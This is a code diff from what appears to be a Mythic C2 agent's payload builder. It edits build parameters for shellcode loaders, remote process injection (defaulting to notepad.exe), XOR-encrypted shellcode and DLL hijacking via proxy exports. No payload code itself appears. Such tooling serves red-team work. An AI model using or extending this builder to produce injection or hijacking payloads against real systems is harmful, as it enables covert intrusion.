@@ -139,14 +139,13 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         ),
 
         BuildParameter(
-            name = "0.2 Loader Format",
+            name = "0.1 Loader Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = f"Select the loader's filetype",
             choices = ["EXE", "DLL"],
             default_value = "EXE",
             hide_conditions = [
-                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
-                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
             ]
         ),
 
@@ -158,7 +157,6 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "debug",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
-                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
             ]
         ),
 
@@ -193,8 +191,8 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         BuildParameter(
             name = "0.5 Shellcode Loader - Target Process",
             parameter_type = BuildParameterType.String,
-            description = "Target process for remote injection (e.g., notepad.exe, explorer.exe)",
-            default_value = "notepad.exe",
+            description = "Target process for remote injection",
+            default_value = "C:\\Windows\\System32\\notepad.exe",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="3"),
@@ -297,10 +295,8 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
             default_value="NONE"
         ),
 
-#
 # TODO:
 # Add more decryption support to loaders
-#
         BuildParameter(
             name = "2.1 Encryption Type",
             parameter_type = BuildParameterType.ChooseOne,
@@ -879,8 +875,7 @@ generated if none have been entered.""",
             templates_path = PurePath(agent_build_path) / "templates"
             dll_exports_path = templates_path / "proxy.def"
 
-            dll_target_path = hijack_dir / "main.cpp"
-            dll_target_path = str(dll_target_path)
+            dll_target_path = templates_path / "dll_target.dll"
 
             templates_path = str(templates_path)
             dll_exports_path = str(dll_exports_path)
@@ -1079,6 +1074,7 @@ generated if none have been entered.""",
             if self.get_parameter("0.0 Main Payload Type") == "Hijack":
                 print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')
 
+                # Get the DLL target's file content & information
                 file_content = await getFileFromMythic(
                     agentFileId=self.get_parameter("1.0 DLL Hijacking")
                 )
@@ -1091,6 +1087,9 @@ generated if none have been entered.""",
                 if file_name_resp.Success:
                     if len(file_name_resp.Files) > 0:
                         dll_file_name = file_name_resp.Files[0].Filename
+
+                with open(dll_target_path, "wb") as file:
+                    file.write(file_content)
 
                 payload_path = PurePath(agent_build_path) / "payload" / dll_file_name
                 payload_path = str(payload_path)
